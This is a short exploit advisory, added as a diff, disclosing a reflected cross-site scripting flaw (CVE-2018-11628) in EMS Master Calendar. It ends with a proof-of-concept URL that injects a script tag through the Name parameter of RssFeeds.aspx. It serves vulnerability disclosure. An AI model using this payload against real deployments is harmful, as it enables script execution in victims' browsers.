@@ -1,0 +1,16 @@
+# Exploit Title: EMS Master Calendar < 8.0.0.20180520 - Reflected Cross-Site Scripting
+# Date:  2018-06-01
+# Exploit Author: Chris Barretto
+# Vendor Homepage: https://www.emssoftware.com/
+# Software Link: https://docs.emssoftware.com/Content/V44.1_ReleaseNotes.htm
+# Version: Versions prior to 8.0.0.201805210 are vulnerable
+# Tested on: Master Calendar v8.0.0.127
+# CVE : CVE-2018-11628
+
+# 1. Description:
+# Data input into EMS Master Calendar before 8.0.0.201805210 via URL parameters are not properly sanitized,
+# allowing malicious attackers to send a crafted URL and execute code in the context of the user's browser.
+
+#2. Proof of concept:
+# The following PoC URL is available:
+https://example.com/MasterCalendar/RssFeeds.aspx?Name=abc<script>alert('XSS')</script>xyz
